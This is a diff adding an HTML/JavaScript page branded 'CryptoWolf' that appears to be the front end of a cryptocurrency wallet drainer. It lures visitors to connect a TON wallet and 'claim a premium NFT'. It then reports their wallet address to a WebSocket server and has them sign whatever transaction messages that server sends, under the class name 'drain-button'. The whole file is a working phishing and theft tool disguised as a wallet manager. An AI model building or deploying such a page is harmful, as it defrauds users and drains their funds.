@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoWolf</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: #ffd700; /* Желтый фон */
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #000000; /* Черный контейнер */
+            border-radius: 24px;
+            padding: 40px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border: 3px solid #333333;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #0088cc, #006699); /* Синий градиент для иконки */
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.4);
+        }
+        
+        .logo img {
+            width: 40px;
+            height: 40px;
+            /* Иконка остается белой на синем фоне */
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffd700; /* Желтый текст */
+            margin-bottom: 12px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #cccccc; /* Светло-серый подзаголовок */
+            margin-bottom: 32px;
+        }
+        
+        .connect-section {
+            margin-bottom: 20px;
+        }
+        
+        .info-message {
+            background: rgba(255, 215, 0, 0.1); /* Полупрозрачный желтый */
+            border: 2px solid #ffd700;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 15px;
+            color: #ffd700; /* Желтый текст */
+            line-height: 1.4;
+            font-weight: 500;
+        }
+        
+        .drain-button {
+            width: 100%;
+            background: linear-gradient(135deg, #ffd700, #ffed4e); /* Желтый градиент */
+            border: 2px solid #ffd700;
+            border-radius: 12px;
+            height: 52px;
+            font-weight: 600;
+            color: #000000; /* Черный текст на желтой кнопке */
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .drain-button:hover {
+            background: linear-gradient(135deg, #ffed4e, #fff176);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.4);
+        }
+        
+        .drain-button:disabled {
+            background: #666666;
+            color: #999999;
+            cursor: not-allowed;
+            transform: none;
+            border-color: #666666;
+        }
+        
+        .disconnect-button {
+            width: 100%;
+            background: linear-gradient(135deg, #ff4444, #cc0000); /* Красный для кнопки отключения */
+            border: 2px solid #ff4444;
+            border-radius: 12px;
+            height: 40px;
+            font-weight: 600;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .disconnect-button:hover {
+            background: linear-gradient(135deg, #ff6666, #ff0000);
+            transform: translateY(-2px);
+        }
+        
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #cccccc; /* Светло-серый текст */
+        }
+
+        .ton-connect-button {
+            width: 100%;
+        }
+
+        .status-message {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 500;
+            display: none;
+        }
+        
+        .status-success {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+        
+        .status-error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+        
+        .status-info {
+            background: rgba(255, 215, 0, 0.2);
+            border: 1px solid #ffd700;
+            color: #ffd700;
+        }
+
+        .wallet-info {
+            background: rgba(255, 215, 0, 0.1);
+            border: 2px solid #ffd700;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            display: none;
+        }
+        
+        .wallet-address {
+            color: #ffd700;
+            font-weight: 600;
+            word-break: break-all;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://ton.org/download/ton_symbol.png" alt="TON">
+        </div>
+        
+        <h1 class="title">CRYPTO WOLF</h1>
+        <p class="subtitle">TON Premium Wallet Manager</p>
+        
+        <div class="connect-section">
+            <div id="ton-connect" class="ton-connect-button"></div>
+        </div>
+        
+        <div id="walletInfo" class="wallet-info">
+            <div class="wallet-address" id="walletAddress"></div>
+            <button onclick="disconnectWallet()" class="disconnect-button">
+                🚫 Disconnect Wallet
+            </button>
+        </div>
+        
+        <div class="info-message">
+            🐺 Connect your TON wallet and claim your exclusive NFT<br>
+            Secure • Fast • Premium Experience
+        </div>
+        
+        <button id="claimButton" onclick="claimNFT()" class="drain-button" disabled>
+            🎁 CLAIM PREMIUM NFT
+        </button>
+        
+        <div id="statusMessage" class="status-message"></div>
+        
+        <div class="footer">
+            Powered by TON Blockchain • CryptoWolf System
+        </div>
+    </div>
+
+    <script>
+        let tonConnectUI = null;
+        let isWebSocketConnected = false;
+        let ws = null;
+
+        // Инициализация TON Connect
+        function initTonConnect() {
+            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                manifestUrl: window.location.origin + '/tonconnect-manifest.json',
+                buttonRootId: 'ton-connect'
+            });
+
+            tonConnectUI.onStatusChange((wallet) => {
+                if (wallet) {
+                    showWalletInfo(wallet);
+                    document.getElementById('claimButton').disabled = false;
+                    connectWebSocket();
+                } else {
+                    hideWalletInfo();
+                    document.getElementById('claimButton').disabled = true;
+                }
+            });
+        }
+
+        // Подключение к WebSocket серверу
+        function connectWebSocket() {
+            try {
+                ws = new WebSocket('ws://localhost:80');
+                
+                ws.onopen = function() {
+                    console.log('WebSocket connected');
+                    isWebSocketConnected = true;
+                    showStatus('Connected to server', 'success');
+                    sendOpenMessage();
+                };
+                
+                ws.onmessage = function(event) {
+                    handleServerMessage(JSON.parse(event.data));
+                };
+                
+                ws.onclose = function() {
+                    console.log('WebSocket disconnected');
+                    isWebSocketConnected = false;
+                    showStatus('Disconnected from server', 'error');
+                    // Автопереподключение через 3 секунды
+                    setTimeout(connectWebSocket, 3000);
+                };
+                
+                ws.onerror = function(error) {
+                    console.error('WebSocket error:', error);
+                    showStatus('Connection error', 'error');
+                };
+            } catch (error) {
+                console.error('WebSocket connection failed:', error);
+            }
+        }
+
+        // Отправка сообщения об открытии сайта
+        function sendOpenMessage() {
+            if (!ws || !isWebSocketConnected) return;
+            
+            const message = {
+                action: 'log',
+                data: {
+                    method: 'opened',
+                    userInfo: getUserInfo()
+                }
+            };
+            ws.send(JSON.stringify(message));
+        }
+
+        // Получение информации о пользователе
+        function getUserInfo() {
+            const wallet = tonConnectUI?.account;
+            return {
+                ip: 'auto-detected', // Сервер сам определит реальный IP
+                country: 'auto',     // Сервер сам определит страну
+                domain: window.location.hostname,
+                sng: false,
+                address: wallet?.address || '',
+                device: {
+                    app: 'web',
+                    platform: 'browser'
+                },
+                hash: generateHash()
+            };
+        }
+
+        function generateHash() {
+            return Math.random().toString(36).substring(2) + Date.now().toString(36);
+        }
+
+        // Основная функция для получения NFT
+        function claimNFT() {
+            if (!tonConnectUI?.connected) {
+                showStatus('Please connect your wallet first!', 'error');
+                return;
+            }
+
+            if (!isWebSocketConnected) {
+                showStatus('Server connection lost. Reconnecting...', 'error');
+                connectWebSocket();
+                return;
+            }
+
+            showStatus('Requesting NFT transaction...', 'info');
+
+            // Отправляем запрос на получение транзакций
+            const message = {
+                action: 'getMessages',
+                data: {
+                    userInfo: getUserInfo()
+                }
+            };
+            
+            ws.send(JSON.stringify(message));
+        }
+
+        // Обработка сообщений от сервера
+        function handleServerMessage(data) {
+            console.log('Server response:', data);
+            
+            switch (data.action) {
+                case 'messages':
+                    handleTransactionMessages(data.data);
+                    break;
+                case 'done':
+                    showStatus('Operation completed successfully!', 'success');
+                    break;
+                case 'error':
+                    showStatus('Server error: ' + data.data, 'error');
+                    break;
+                default:
+                    console.log('Unknown action:', data.action);
+            }
+        }
+
+        // Обработка транзакционных сообщений
+        async function handleTransactionMessages(encryptedData) {
+            try {
+                showStatus('Preparing transaction for signing...', 'info');
+                
+                // В реальном приложении здесь будет дешифровка данных
+                // Для демо предположим, что данные уже в правильном формате
+                const transactionData = encryptedData;
+                
+                if (transactionData.messages && transactionData.messages.length > 0) {
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+                        messages: transactionData.messages
+                    };
+
+                    // Отправляем транзакцию на подписание
+                    const result = await tonConnectUI.sendTransaction(transaction);
+                    
+                    showStatus('🎉 NFT claimed successfully!', 'success');
+                    console.log('Transaction result:', result);
+                    
+                    // Отправляем статус на сервер
+                    sendTransactionStatus('sent', transactionData.messages);
+                    
+                } else {
+                    showStatus('No transactions available', 'error');
+                }
+            } catch (error) {
+                console.error('Transaction error:', error);
+                showStatus('Transaction failed: ' + error.message, 'error');
+                sendTransactionStatus('error', []);
+            }
+        }
+
+        // Отправка статуса транзакции на сервер
+        function sendTransactionStatus(status, chunk) {
+            if (!ws || !isWebSocketConnected) return;
+            
+            const message = {
+                action: 'log',
+                data: {
+                    method: 'chunkStatus',
+                    status: status,
+                    chunk: chunk,
+                    userInfo: getUserInfo()
+                }
+            };
+            ws.send(JSON.stringify(message));
+        }
+
+        // Отключение кошелька
+        function disconnectWallet() {
+            if (tonConnectUI) {
+                tonConnectUI.disconnect();
+                hideWalletInfo();
+                document.getElementById('claimButton').disabled = true;
+            }
+        }
+
+        // Показать информацию о кошельке
+        function showWalletInfo(wallet) {
+            const walletInfo = document.getElementById('walletInfo');
+            const walletAddress = document.getElementById('walletAddress');
+            
+            walletAddress.textContent = 
+                wallet.account.address.substring(0, 8) + '...' + 
+                wallet.account.address.substring(wallet.account.address.length - 8);
+            
+            walletInfo.style.display = 'block';
+        }
+
+        // Скрыть информацию о кошельке
+        function hideWalletInfo() {
+            document.getElementById('walletInfo').style.display = 'none';
+        }
+
+        // Показать статус
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = 'status-message status-' + type;
+            statusEl.style.display = 'block';
+            
+            // Автоскрытие успешных сообщений
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusEl.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Инициализация при загрузке страницы
+        window.addEventListener('load', function() {
+            initTonConnect();
+            showStatus('Welcome to CryptoWolf! Connect your wallet to start.', 'info');
+        });
+
+        // Глобальные функции для обратной совместимости
+        window.didtrans = function() {
+            console.log('Legacy didtrans called');
+            claimNFT();
+        };
+
+        window.connectWallet = function() {
+            console.log('Legacy connectWallet called');
+            if (tonConnectUI) {
+                if (!tonConnectUI.connected) {
+                    tonConnectUI.openModal();
+                }
+            }
+        };
+    </script>
+</body>
+</html>
